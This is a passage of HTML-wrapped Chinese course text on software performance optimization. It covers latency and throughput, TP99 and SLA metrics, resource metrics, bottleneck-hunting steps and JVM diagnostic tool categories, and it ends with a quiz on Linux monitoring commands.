data-slate-object="block" data-key="359"> <span data-slate-object="text" data-key="360"><span 
data-slate-leaf="true" data-offset-key="360:0" data-first-offset="true"><span data-slate-string="true">上面我举了几个对于该性能问题的“优化”可以考虑的方面，但相信你也看到了，与其说这些手段是“优化”，倒不如说是“设计”。当时那个项目，我们被迫加班加点，周末时间顶着客户不满赶工出一个线上的临时处理方案来缓解问题，并最终花了一周时间重构这部分设计，才算彻底地解决了这个问题。</span></span></span> 
</div> <div class="se-1737d94b " data-slate-type="paragraph" data-slate-object="block" data-key="361"> 
<span data-slate-object="text" data-key="362"><span data-slate-leaf="true" data-offset-key="362:0" 
data-first-offset="true"><span data-slate-string="true">这个教训是深刻的，</span></span></span><span 
data-slate-object="text" data-key="363"><span data-slate-leaf="true" data-offset-key="363:0" 
data-first-offset="true"><span class="se-8479366c" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">从工程上看，整个设计、开发、测试到运维一系列的步骤里面，我们总是不得不至少在某一个步骤做到足够细致和周全，这里的细致指的是深度，而周全则意味着广度。</span></span></span></span> 
</div> <div class="se-4d155b98 " data-slate-type="paragraph" data-slate-object="block" data-key="364"> 
<span data-slate-object="text" data-key="365"><span data-slate-leaf="true" data-offset-key="365:0" 
data-first-offset="true"><span data-slate-string="true">最理想的情况当然是在产品设计阶段就意识到这个问题，但是这也是最难的；如果产品设计阶段做不到，那么开发实现阶段，开发人员通过深入的思考就能够意识到这个问题；如果开发阶段做不到，在测试阶段如果可以进行细致和周全的思考，也可以发现这个问题；如果测试阶段还没有做到，那就只好等着上线以后，问题发生来打脸了。当然，这里面的代价是随着工程流程向后进行而递增的。</span></span></span> 
</div> <div class="se-5c60ae7e " data-slate-type="paragraph" data-slate-object="block" data-key="366"> 
<span data-slate-object="text" data-key="367"><span data-slate-leaf="true" data-offset-key="367:0" 
data-first-offset="true"><span data-slate-string="true">到这里，我想你应该理解了为什么说“好的性能是设计出来的”，但是说说容易做却难。如果由于种种原因，我们还是遇到了需要在项目的中后期，来做性能优化的情况，那么这时候，我们可以遵循这样三条原则来进行：</span></span></span> 
</div> <div class="se-14f4bd94" data-slate-type="list" data-slate-object="block" data-key="368"> 
<div class="se-5447f470 se-51d28ac1" data-slate-type="list-line" data-slate-object="block" 
data-key="369"> <span data-slate-object="text" data-key="370"><span data-slate-leaf="true" 
data-offset-key="370:0" data-first-offset="true"><span data-slate-string="true">问题定位，出现性能瓶颈，定位清楚问题的原因，是进行后面优化工作的前提；</span></span></span> 
</div> <div class="se-e20996e4 se-00660223" data-slate-type="list-line" data-slate-object="block" 
data-key="371"> <span data-slate-object="text" data-key="372"><span data-slate-leaf="true" 
data-offset-key="372:0" data-first-offset="true"><span data-slate-string="true">问题解决，有时候问题比较棘手，我们可能会将解决方案划分为临时方案和长期方案，分别进行；</span></span></span> 
</div> <div class="se-46bc9ead se-9cfb526c" data-slate-type="list-line" data-slate-object="block" 
data-key="373"> <span data-slate-object="text" data-key="374"><span data-slate-leaf="true" 
data-offset-key="374:0" data-first-offset="true"><span data-slate-string="true">问题泛化，这指的是将解决一个问题泛化到更大的维度上，比如项目中还有没有类似的隐患？能不能总结经验以供未来的其他开发人员学习？这些是为了提高对未发生问题的预见性。</span></span></span> 
</div> </div> <h2 class="se-f6c3220e" data-slate-type="heading" data-slate-object="block" data-key="375"><span 
data-slate-object="text" data-key="376"><span data-slate-leaf="true" data-offset-key="376:0" 
data-first-offset="true"><span data-slate-string="true">性能指标与关注点</span></span></span></h2> 
<div class="se-069af350 " data-slate-type="paragraph" data-slate-object="block" data-key="377"> 
<span data-slate-object="text" data-key="378"><span data-slate-leaf="true" data-offset-key="378:0" 
data-first-offset="true"><span data-slate-string="true">在我们从产品经理手里拿到产品设计文档的时候，性能指标就应当有一定程度的明确了。性能指标基本上包含两个大类，一个是从业务角度定义的，另一个是从资源角度定义的。</span></span></span> 
</div> <div class="se-44412908 " data-slate-type="paragraph" data-slate-object="block" data-key="379"> 
<span data-slate-object="text" data-key="380"><span data-slate-leaf="true" data-offset-key="380:0" 
data-first-offset="true"><span data-slate-string="true">通常产品经理给的需求或设计文档中，就应当包含一些关键的业务角度定义的性能指标了，但是资源角度的性能指标，产品经理通常不怎么关心。一般说来，比如我们</span></span></span><span 
data-slate-object="text" data-key="381"><span data-slate-leaf="true" data-offset-key="381:0" 
data-first-offset="true"><span class="se-9d93f5b4" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">最关心的性能指标，也往往就是从业务角度定义的，它可以说是“越高越好”；而资源角度，程序员有时考虑的却是“越低越好”，有时则是“达标就好”。</span></span></span></span> 
</div> <h3 class="se-c1b2a334" data-slate-type="heading" data-slate-object="block" data-key="382"><span 
data-slate-object="text" data-key="383"><span data-slate-leaf="true" data-offset-key="383:0" 
data-first-offset="true"><span data-slate-string="true">1. 业务角度</span></span></span></h3> <div 
class="se-9e27e55b " data-slate-type="paragraph" data-slate-object="block" data-key="384"> 
<span data-slate-object="text" data-key="385"><span data-slate-leaf="true" data-offset-key="385:0" 
data-first-offset="true"><span data-slate-string="true">你可以回想一下 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="386" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="387"><span data-slate-leaf="true" data-offset-key="387:0" data-first-offset="true"><span 
data-slate-string="true">[第 21 讲]</span></span></span></a><span data-slate-object="text" data-key="388"><span 
data-slate-leaf="true" data-offset-key="388:0" data-first-offset="true"><span data-slate-string="true">，我们在那时就介绍了缓存的使用动机，就是节约开销。这和性能指标的关注点如出一辙，既包括延迟（latency）和吞吐量（throughput），这两个同时往往也是业务角度最重要的性能指标，又包括资源消耗，这也完全符合前面说的资源角度。</span></span></span> 
</div> <div class="se-a54947a0 " data-slate-type="paragraph" data-slate-object="block" data-key="389"> 
<span data-slate-object="text" data-key="390"><span data-slate-leaf="true" data-offset-key="390:0" 
data-first-offset="true"><span data-slate-string="true">延迟和吞吐量，这两个指标往往是应用性能评估中最重要的两个。先来明确二者的定义：延迟，其实就是响应时间，指的是客户端发送请求以后，到收到该请求的响应，中间需要的时间消耗；而吞吐量，指的是系统处理请求的速率，反映的是单位时间内处理请求的能力。</span></span></span> 
</div> <div class="se-1183fbf6 " data-slate-type="paragraph" data-slate-object="block" data-key="391"> 
<span data-slate-object="text" data-key="392"><span data-slate-leaf="true" data-offset-key="392:0" 
data-first-offset="true"><span data-slate-string="true">一般说来，</span></span></span><span data-slate-object="text" 
data-key="393"><span data-slate-leaf="true" data-offset-key="393:0" data-first-offset="true"><span 
class="se-d4e57950" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">延迟和吞吐量是既互斥、又相辅相成的关系。</span></span></span></span><span 
data-slate-object="text" data-key="394"><span data-slate-leaf="true" data-offset-key="394:0" 
data-first-offset="true"><span data-slate-string="true">一图胜千言，且看这个典型例子（下图来自</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="395" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="396"><span data-slate-leaf="true" data-offset-key="396:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="397"><span data-slate-leaf="true" data-offset-key="397:0" 
data-first-offset="true"><span data-slate-string="true">，这个图因很有典型意义而被到处转载）：</span></span></span> 
</div> <div class="se-66b862d9" data-slate-type="image" data-slate-object="block" data-key="398"> 
<img class="se-49761d8e" src="https://static001.geekbang.org/resource/image/69/f8/6925e8b275b09943c3f6918bc8d1f4f8.png"> 
</div> <div class="se-59ea6d73 " data-slate-type="paragraph" data-slate-object="block" data-key="399"> 
<span data-slate-object="text" data-key="400"><span data-slate-leaf="true" data-offset-key="400:0" 
data-first-offset="true"><span data-slate-string="true">总体来说，随着压力的增大，同等时间内应用被调用的次数增加，我们可以发现这样几个规律：</span></span></span> 
</div> <div class="se-ed41b03f" data-slate-type="list" data-slate-object="block" data-key="401"> 
<div class="se-43b7508b se-f2bf9d25" data-slate-type="list-line" data-slate-object="block" 
data-key="402"> <span data-slate-object="text" data-key="403"><span data-slate-leaf="true" 
data-offset-key="403:0" data-first-offset="true"><span class="se-03704314" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">单独观察 Latency 曲线，延迟总是非递减的。一开始延迟可以说几乎不变，到了某一个特定的值（转折点）以后，延迟突然迅速增大。</span></span></span></span> 
</div> <div class="se-f420fa9b se-340cf1a5" data-slate-type="list-line" data-slate-object="block" 
data-key="404"> <span data-slate-object="text" data-key="405"><span data-slate-leaf="true" 
data-offset-key="405:0" data-first-offset="true"><span class="se-22238eb6" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">再来单独观察 Throughput 曲线，吞吐量总是一个先线性增大，后来增长减缓，到达峰值后逐渐减小的过程。</span></span></span></span> 
</div> <div class="se-977df12e se-7bcb59c8" data-slate-type="list-line" data-slate-object="block" 
data-key="406"> <span data-slate-object="text" data-key="407"><span data-slate-leaf="true" 
data-offset-key="407:0" data-first-offset="true"><span data-slate-string="true">再把两者结合起来观察，延迟曲线前面提到的那个转折点，和吞吐量的最高点，通常在一个比较接近的位置上，并且</span></span></span><span 
data-slate-object="text" data-key="408"><span data-slate-leaf="true" data-offset-key="408:0" 
data-first-offset="true"><span class="se-40c9ee77" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">延迟的转折点往往要略先于吞吐量的最高点出现</span></span></span></span><span data-slate-object="text" 
data-key="409"><span data-slate-leaf="true" data-offset-key="409:0" data-first-offset="true"><span 
data-slate-string="true">。</span></span></span> </div> </div> <div class="se-82e6ca2b " data-slate-type="paragraph" 
data-slate-object="block" data-key="410"> <span data-slate-object="text" data-key="411"><span 
data-slate-leaf="true" data-offset-key="411:0" data-first-offset="true"><span data-slate-string="true">一般说来，延迟会先上升，随着延迟的上升，吞吐量增大的斜率会越来越小，直到达到最高点，之后开始回落。请注意这个系统能达到的最佳吞吐量的点，这个点往往意味着延迟已经开始增大一小段时间了，因此对于一些延迟要求比较高的系统，我们是不允许它达到这个吞吐量的最高点的。</span></span></span> 
</div> <div class="se-129bd066 " data-slate-type="paragraph" data-slate-object="block" data-key="412"> 
<span data-slate-object="text" data-key="413"><span data-slate-leaf="true" data-offset-key="413:0" 
data-first-offset="true"><span data-slate-string="true">从这个图我们也可以看出，</span></span></span><span 
data-slate-object="text" data-key="414"><span data-slate-leaf="true" data-offset-key="414:0" 
data-first-offset="true"><span class="se-1736331f" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">如果我们不做流量控制，在系统压力大到一定程度的时候，系统并非只能做它“力所能及”的工作，而往往是“什么也做不成”了。</span></span></span></span><span 
data-slate-object="text" data-key="415"><span data-slate-leaf="true" data-offset-key="415:0" 
data-first-offset="true"><span data-slate-string="true">这也是一些不够健壮的系统，在压力较大的特殊业务场景，直接崩溃，对所有用户都拒绝服务的原因。</span></span></span> 
</div> <div class="se-afe8b5e0 " data-slate-type="paragraph" data-slate-object="block" data-key="416"> 
<span data-slate-object="text" data-key="417"><span data-slate-leaf="true" data-offset-key="417:0" 
data-first-offset="true"><span data-slate-string="true">其它较常见的业务角度定义的性能指标还包括：</span></span></span> 
</div> <div class="se-56c655d2" data-slate-type="list" data-slate-object="block" data-key="418"> 
<div class="se-a9862f3a se-012c5467" data-slate-type="list-line" data-slate-object="block" 
data-key="419"> <span data-slate-object="text" data-key="420"><span data-slate-leaf="true" 
data-offset-key="420:0" data-first-offset="true"><span data-slate-string="true">TPS：Transactions 
Per Second，每秒处理的事务数。相似的还有 QPS，Queries Per Second，每秒处理的查询数量等等。</span></span></span> </div> <div 
class="se-bbb212cc se-66e9e830" data-slate-type="list-line" data-slate-object="block" data-key="421"> 
<span data-slate-object="text" data-key="422"><span data-slate-leaf="true" data-offset-key="422:0" 
data-first-offset="true"><span data-slate-string="true">并发用户数：同一时间有多少用户在使用系统。对于网站来说，由于 HTTP 
连接的无状态性，往往会使用服务端的会话数量来定义有多少用户同时访问系统。</span></span></span> </div> <div class="se-2df654c9 se-a54360c3" 
data-slate-type="list-line" data-slate-object="block" data-key="423"> <span data-slate-object="text" 
data-key="424"><span data-slate-leaf="true" data-offset-key="424:0" data-first-offset="true"><span 
data-slate-string="true">TP99：指的是请求中 99% 的请求能达到的性能，这里的 TP 是 Top Percentile 的缩写。比如，我们说某系统响应时间的 
TP99 是 1 秒，指的就是 99% 的请求，都可以在 1 秒之内响应，至于剩下的 1% 就不一定了。</span></span></span> </div> </div> <div 
class="se-71452250 " data-slate-type="paragraph" data-slate-object="block" data-key="425"> 
<span data-slate-object="text" data-key="426"><span data-slate-leaf="true" data-offset-key="426:0" 
data-first-offset="true"><span data-slate-string="true">关于 TP99，为什么我们使用这种分布比例的方式，而不是使用简单的平均数来定义呢？</span></span></span> 
</div> <div class="se-dfd46e8f " data-slate-type="paragraph" data-slate-object="block" data-key="427"> 
<span data-slate-object="text" data-key="428"><span data-slate-leaf="true" data-offset-key="428:0" 
data-first-offset="true"><span data-slate-string="true">这是因为</span></span></span><span data-slate-object="text" 
data-key="429"><span data-slate-leaf="true" data-offset-key="429:0" data-first-offset="true"><span 
class="se-676e7f19" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">性能平均数在真实的系统中往往不科学</span></span></span></span><span 
data-slate-object="text" data-key="430"><span data-slate-leaf="true" data-offset-key="430:0" 
data-first-offset="true"><span data-slate-string="true">。举例来说，在一个系统的 100 个请求中，99 个都在 1 秒左右返回了，还有一个 
100 秒还不返回，那平均时间会大于 (99 x 1 + 1 x 100) / 100，大约等于 2 秒，这显然不能反映系统的真实情况。因为那一个耗时特别长的请求其实是一个异常，而非正常的请求，正常的请求平均时间就是 
1 秒，而 TP99 就比较能反映真实情况了，因为 TP99 就可以达到 1 秒。</span></span></span> </div> <div class="se-a743f572 
" data-slate-type="paragraph" data-slate-object="block" data-key="431"> <span data-slate-object="text" 
data-key="432"><span data-slate-leaf="true" data-offset-key="432:0" data-first-offset="true"><span 
data-slate-string="true">有了 TP99 这样的概念，就可以定义系统的 SLA 了，SLA 是 Service-Level Agreement，它是系统对于它的客户所承诺的可以提供的服务质量，既包括功能，也包括性能。在性能方面，SLA 
的核心定义往往就是基于 Top Percentile 来进行的。比方说，一个网站的 SLA 要求它对于浏览器响应时间的 TP95 为 3 秒。</span></span></span> 
</div> <h3 class="se-58731199" data-slate-type="heading" data-slate-object="block" data-key="433"><span 
data-slate-object="text" data-key="434"><span data-slate-leaf="true" data-offset-key="434:0" 
data-first-offset="true"><span data-slate-string="true">2. 资源角度</span></span></span></h3> <div 
class="se-74c3c34f " data-slate-type="paragraph" data-slate-object="block" data-key="435"> 
<span data-slate-object="text" data-key="436"><span data-slate-leaf="true" data-offset-key="436:0" 
data-first-offset="true"><span data-slate-string="true">相应的，资源指标包括 CPU 占用、内存占用、磁盘 I/O、网络 I/O 
等等。常规来讲，平均使用率和峰值都是我们比较关心的两个数据。一般我们可以把系统上限的一个比例，比如 60% 或者 80% 定义为一个安全阈值，一旦超过（比如 x 分钟内有 y 次检测到指标超过该阈值，这种复杂指标设置的目的在于考虑性能波动，减少假警报）就要告警。</span></span></span> 
</div> <h2 class="se-125bac23" data-slate-type="heading" data-slate-object="block" data-key="437"><span 
data-slate-object="text" data-key="438"><span data-slate-leaf="true" data-offset-key="438:0" 
data-first-offset="true"><span data-slate-string="true">寻找性能瓶颈</span></span></span></h2> <div 
class="se-66adb258 " data-slate-type="paragraph" data-slate-object="block" data-key="439"> 
<span data-slate-object="text" data-key="440"><span data-slate-leaf="true" data-offset-key="440:0" 
data-first-offset="true"><span data-slate-string="true">很多时候，如果我们能找到系统的性能瓶颈，其实就已经解决了一半问题。值得注意的是，性能的瓶颈并不是系统暴露在表面的问题，比如，TP99 
的延迟不达标是表面问题，而不是系统瓶颈。</span></span></span> </div> <h3 class="se-b7c362af" data-slate-type="heading" 
data-slate-object="block" data-key="441"><span data-slate-object="text" data-key="442"><span 
data-slate-leaf="true" data-offset-key="442:0" data-first-offset="true"><span data-slate-string="true">大致思路</span></span></span></h3> 
<div class="se-bdff15db " data-slate-type="paragraph" data-slate-object="block" data-key="443"> 
<span data-slate-object="text" data-key="444"><span data-slate-leaf="true" data-offset-key="444:0" 
data-first-offset="true"><span data-slate-string="true">在性能优化这个繁琐的过程当中，一要寻找问题，二才是解决问题，而寻找性能瓶颈就和寻找根本原因有关，也是一个很有意思的事儿。不同的人显然会有不同的看法，我在网站项目中进行性能瓶颈的定位时，常常会遵循下面几个步骤，换句话说，这个步骤来自于我的经验：</span></span></span> 
</div> <div class="se-c5017128 " data-slate-type="paragraph" data-slate-object="block" data-key="445"> 
<span data-slate-object="text" data-key="446"><span data-slate-leaf="true" data-offset-key="446:0" 
data-first-offset="true"><span class="se-4a861176" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">首先，我们应该对系统有一个大致的预期。</span></span></span></span><span data-slate-object="text" 
data-key="447"><span data-slate-leaf="true" data-offset-key="447:0" data-first-offset="true"><span 
data-slate-string="true">举例来说，根据现有的架构和硬件，在当前的请求模型下，我们希望单台机器能够负载 100 TPS 的请求，这些是设计阶段就考虑清楚的。我看到有些项目中，这些没有在开始定义清楚，等系统大致做好了，再来定义性能目标，这时候把性能优化的工程师推上去优化，就缺乏一定的目的性，谁也不知道优化到什么程度是个头。比方说，当前性能是 
80 TPS，那么要优化到 100 TPS，可能小修小补，很小的代价就可以做到；但是要优化到 500 TPS，那么很可能要在产品和架构上做调整，代价往往是很不一样的，没有预期而直接生米煮熟饭显然是不合工程性的。</span></span></span> 
</div> <div class="se-dda08e2f " data-slate-type="paragraph" data-slate-object="block" data-key="448"> 
<span data-slate-object="text" data-key="449"><span data-slate-leaf="true" data-offset-key="449:0" 
data-first-offset="true"><span class="se-e8a4f88e" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">其次，过一遍待优化业务的环境、配置、代码，对于整个请求的处理流程做到心中有数。</span></span></span></span><span 
data-slate-object="text" data-key="450"><span data-slate-leaf="true" data-offset-key="450:0" 
data-first-offset="true"><span data-slate-string="true">说白了，这就是走读代码，这个代码既包括应用的源码，也要了解环境和配置，知道整个流程的处理一步一步是怎样进行的。比如说，浏览器上用户触发事件以后，服务端的应用从线程池里面取得了线程来处理请求，接着查询了几次数据库，每次都从连接池中取出或建立连接，进行若干的查询或事务读写操作，再对响应做序列化返回浏览器，而浏览器收到请求以后又进行解析并将执行渲染。值得一提的是，这个过程中，全栈工程师的价值就体现出来了，因为他能够有端到端的视野来看待这个问题，分析整个流程。</span></span></span> 
</div> <div class="se-28c8e813 " data-slate-type="paragraph" data-slate-object="block" data-key="451"> 
<span data-slate-object="text" data-key="452"><span data-slate-leaf="true" data-offset-key="452:0" 
data-first-offset="true"><span class="se-ef5221e2" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">再次，开始压测，缓慢、逐步增大请求速率，直到预期的业务角度的性能指标无法再提升，待系统稳定。</span></span></span></span><span 
data-slate-object="text" data-key="453"><span data-slate-leaf="true" data-offset-key="453:0" 
data-first-offset="true"><span data-slate-string="true">有些指标可能一开始就不满足要求，比如某系统的延迟，在一开始就不达标；也有时候是随着压力增大才发现不达标的，比如多数系统的吞吐量，随着压力增大，吞吐量上不去了。通常，我们可以给到系统一个足够的压力，或者等于、甚至高于系统最大的吞吐量，且待系统稳定后，再来分析，这种情况下我们可以把问题暴露得更彻底。</span></span></span> 
</div> <div class="se-6a24f7c8 " data-slate-type="paragraph" data-slate-object="block" data-key="454"> 
<span data-slate-object="text" data-key="455"><span data-slate-leaf="true" data-offset-key="455:0" 
data-first-offset="true"><span class="se-7658e54a" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">最后，才是根据业务角度的指标来进行特定的分析</span></span></span></span><span data-slate-object="text" 
data-key="456"><span data-slate-leaf="true" data-offset-key="456:0" data-first-offset="true"><span 
data-slate-string="true">，我就以最常见的延迟和吞吐量这两个为例来说明。</span></span></span> </div> <div class="se-0673b721 
" data-slate-type="paragraph" data-slate-object="block" data-key="457"> <span data-slate-object="text" 
data-key="458"><span data-slate-leaf="true" data-offset-key="458:0" data-first-offset="true"><span 
class="se-ae0a5515" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">1. 
对于延迟一类的问题</span></span></span></span> </div> <div class="se-d47c5d2c " data-slate-type="paragraph" 
data-slate-object="block" data-key="459"> <span data-slate-object="text" data-key="460"><span 
data-slate-leaf="true" data-offset-key="460:0" data-first-offset="true"><span data-slate-string="true">从大的流程到小的环节，从操作系统到应用本身，逐步定位，寻找端到端的时间消耗在哪里。比方说，可以</span></span></span><span 
data-slate-object="text" data-key="461"><span data-slate-leaf="true" data-offset-key="461:0" 
data-first-offset="true"><span class="se-332d11ec" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">优先考虑系统快照类的工具</span></span></span></span><span data-slate-object="text" 
data-key="462"><span data-slate-leaf="true" data-offset-key="462:0" data-first-offset="true"><span 
data-slate-string="true">，像是 jstack、kill -3 命令可以打印系统当前的线程执行堆栈，因为这一类工具往往执行比较简单，对系统的影响较小；如果还需要进一步明确，</span></span></span><span 
data-slate-object="text" data-key="463"><span data-slate-leaf="true" data-offset-key="463:0" 
data-first-offset="true"><span class="se-869f3ead" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">其次再考虑侵入性较强的，运行时剖面分析（profile）类型的工具</span></span></span></span><span 
data-slate-object="text" data-key="464"><span data-slate-leaf="true" data-offset-key="464:0" 
data-first-offset="true"><span data-slate-string="true">，比如 JProfiler。如果发现运行的 50 个线程里面，有 48 
个卡在等某一个锁的释放上面，这就值得怀疑该锁的占用是造成延迟问题的罪魁祸首。</span></span></span> </div> <div class="se-5161f551 
" data-slate-type="paragraph" data-slate-object="block" data-key="465"> <span data-slate-object="text" 
data-key="466"><span data-slate-leaf="true" data-offset-key="466:0" data-first-offset="true"><span 
class="se-e9de66e3" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">2. 
对于吞吐量一类的问题</span></span></span></span> </div> <div class="se-2f8fc6d2 " data-slate-type="paragraph" 
data-slate-object="block" data-key="467"> <span data-slate-object="text" data-key="468"><span 
data-slate-leaf="true" data-offset-key="468:0" data-first-offset="true"><span data-slate-string="true">这类问题 
CPU 是核心。在请求速率逐步增大时，我们来看这样四种情况：</span></span></span> </div> <div class="se-14013f76" data-slate-type="list" 
data-slate-object="block" data-key="469"> <div class="se-6ba19e54 se-92987b47" data-slate-type="list-line" 
data-slate-object="block" data-key="470"> <span data-slate-object="text" data-key="471"><span 
data-slate-leaf="true" data-offset-key="471:0" data-first-offset="true"><span class="se-10cc428d" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">吞吐量逐步上升，而 CPU 
变化很小。</span></span></span></span><span data-slate-object="text" data-key="472"><span data-slate-leaf="true" 
data-offset-key="472:0" data-first-offset="true"><span data-slate-string="true">这种情况说明系统设计得比较好，能继续“扛”更高的负载，该阶段可以继续增大请求速率。</span></span></span> 
</div> <div class="se-0e831060 se-f5116ab0" data-slate-type="list-line" data-slate-object="block" 
data-key="473"> <span data-slate-object="text" data-key="474"><span data-slate-leaf="true" 
data-offset-key="474:0" data-first-offset="true"><span class="se-957ab8b8" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">吞吐量逐步上升，而 CPU 也平稳上升。</span></span></span></span><span 
data-slate-object="text" data-key="475"><span data-slate-leaf="true" data-offset-key="475:0" 
data-first-offset="true"><span data-slate-string="true">其实这还算是一种较为理想的系统，CPU 使用随着吞吐量的上升而平稳上升，直到 
CPU 成为瓶颈——这里的原因很简单，用于业务处理的 CPU 是真正“干活的”，这部分的消耗显然是少不了的。如果这种情况下 CPU 已经很高了却还要优化，那就是说在不能动硬件的情况下，我们需要改进算法了，因为 
CPU 已经在拼命干活了。就像程序员一周已经加班五十个小时了，还要再压迫他们，就要出事（系统崩溃）了。</span></span></span> </div> <div class="se-c35c25b8 
se-ab6452e2" data-slate-type="list-line" data-slate-object="block" data-key="476"> <span data-slate-object="text" 
data-key="477"><span data-slate-leaf="true" data-offset-key="477:0" data-first-offset="true"><span 
class="se-5ea22f1f" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">吞吐量变化很小甚至回落，而 
CPU 大幅上升。</span></span></span></span><span data-slate-object="text" data-key="478"><span data-slate-leaf="true" 
data-offset-key="478:0" data-first-offset="true"><span data-slate-string="true">这种情况说明 CPU 
的确在干活，却不是用于预期内的“业务处理”。最典型的例子就是，内存泄漏，系统在一个劲地 GC，CPU 看起来忙得要命，但是却不是忙于业务。</span></span></span> 
</div> <div class="se-03a573e6 se-a0be8c89" data-slate-type="list-line" data-slate-object="block" 
data-key="479"> <span data-slate-object="text" data-key="480"><span data-slate-leaf="true" 
data-offset-key="480:0" data-first-offset="true"><span class="se-6478a3f2" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">吞吐量上不去，CPU 也上不去。</span></span></span></span><span 
data-slate-object="text" data-key="481"><span data-slate-leaf="true" data-offset-key="481:0" 
data-first-offset="true"><span data-slate-string="true">这种情况其实非常常见，而且随着压力的增大，它往往伴随着延迟的上升。这种情况是说，CPU 
无法成为瓶颈，因为其它瓶颈先出现了，因此这种情况下就要检查磁盘 I/O、网络带宽、工作线程数等等。这就像是一个运动员的潜力（CPU）还很大，但是由于种种原因，比如技巧问题、心理原因，潜力发挥不出来，因此我们优化的目的，就是努力找到并移除当前的瓶颈，将 
CPU 的这个潜力发挥出来。</span></span></span> </div> </div> <h3 class="se-1740748e" data-slate-type="heading" 
data-slate-object="block" data-key="482"><span data-slate-object="text" data-key="483"><span 
data-slate-leaf="true" data-offset-key="483:0" data-first-offset="true"><span data-slate-string="true">工具的分类</span></span></span></h3> 
<div class="se-d45642ad " data-slate-type="paragraph" data-slate-object="block" data-key="484"> 
<span data-slate-object="text" data-key="485"><span data-slate-leaf="true" data-offset-key="485:0" 
data-first-offset="true"><span data-slate-string="true">在定位性能瓶颈的过程中，我们会和各种各样的工具打交道，在我看来，这些工具中最典型的有这样三种类型：</span></span></span> 
</div> <div class="se-92976acf" data-slate-type="list" data-slate-object="block" data-key="486"> 
<div class="se-6db98f43 se-e0efceff" data-slate-type="list-line" data-slate-object="block" 
data-key="487"> <span data-slate-object="text" data-key="488"><span data-slate-leaf="true" 
data-offset-key="488:0" data-first-offset="true"><span data-slate-string="true">截取型：截取系统某个层面的一个快照加以分析。比如一些堆栈切面和分析的工具，jstack、jmap、kill 
-3、MAT、Heap Analyser 等，这类工具使用简单，对系统影响往往比较小。</span></span></span> </div> <div class="se-616d3e5e 
se-2b309b61" data-slate-type="list-line" data-slate-object="block" data-key="489"> <span data-slate-object="text" 
data-key="490"><span data-slate-leaf="true" data-offset-key="490:0" data-first-offset="true"><span 
data-slate-string="true">监控型：监视、剖析系统变化，甚至数据流向。比如 JProfiler、JConsole、JStat、BTrace 等等，如前文所述，这类工具的侵入性往往更高，甚至本身就会大幅影响性能。</span></span></span> 
</div> <div class="se-c173c742 se-c0e74b62" data-slate-type="list-line" data-slate-object="block" 
data-key="491"> <span data-slate-object="text" data-key="492"><span data-slate-leaf="true" 
data-offset-key="492:0" data-first-offset="true"><span data-slate-string="true">验尸型：系统已经宕机或完成运行任务了，但是留下了一些“罪证”，我们在事后来分析它们。最有名的就是 
JVM 挂掉之后可能会留下的 hs_err_pid.log，或者是生成的 crash dump 文件。</span></span></span> </div> </div> <h2 
class="se-64d0fd61" data-slate-type="heading" data-slate-object="block" data-key="493"><span 
data-slate-object="text" data-key="494"><span data-slate-leaf="true" data-offset-key="494:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-87eed30b " data-slate-type="paragraph" data-slate-object="block" data-key="495"> 
<span data-slate-object="text" data-key="496"><span data-slate-leaf="true" data-offset-key="496:0" 
data-first-offset="true"><span data-slate-string="true">今天我们学习了性能优化的基本知识，包括性能优化和软件设计的关系，性能指标和关注点，以及怎样去寻找性能瓶颈，希望你能够理解，在跳进性能优化的“坑”之前先有了足够的认识、分析和思考。</span></span></span> 
</div> <div class="se-7b66fde3 " data-slate-type="paragraph" data-slate-object="block" data-key="497"> 
<span data-slate-object="text" data-key="498"><span data-slate-leaf="true" data-offset-key="498:0" 
data-first-offset="true"><span data-slate-string="true">现在，我来提一个问题吧：对于下面这些资源角度定义的性能指标，你能说说在 
Linux 下，该用怎样的工具或命令来查看吗？</span></span></span> </div> <div class="se-ea17fbbf" data-slate-type="list" 
data-slate-object="block" data-key="499"> <div class="se-2ee118c8 se-422be6bd" data-slate-type="list-line" 
data-slate-object="block" data-key="500"> <span data-slate-object="text" data-key="501"><span 
data-slate-leaf="true" data-offset-key="501:0" data-first-offset="true"><span data-slate-string="true">CPU 
使用率、负载；</span></span></span> </div> <div class="se-543cba58 se-ca9a5cfc" data-slate-type="list-line" 
data-slate-object="block" data-key="502"> <span data-slate-object="text" data-key="503"><span 
data-slate-leaf="true" data-offset-key="503:0" data-first-offset="true"><span data-slate-string="true">可用内存、换页；</span></span></span> 
</div> <div class="se-0b2df593 se-00bcaa34" data-slate-type="list-line" data-slate-object="block" 
data-key="504"> <span data-slate-object="text" data-key="505"><span data-slate-leaf="true" 
data-offset-key="505:0" data-first-offset="true"><span data-slate-string="true">磁盘 I/O；</span></span></span> 
</div> <div class="se-a8702aff se-ad55ff5f" data-slate-type="list-line" data-slate-object="block" 
data-key="506"> <span data-slate-object="text" data-key="507"><span data-slate-leaf="true" 
data-offset-key="507:0" data-first-offset="true"><span data-slate-string="true">网络 I/O；</span></span></span> 
</div> <div class="se-fd6505b6 se-0b6725a7" data-slate-type="list-line" data-slate-object="block" 
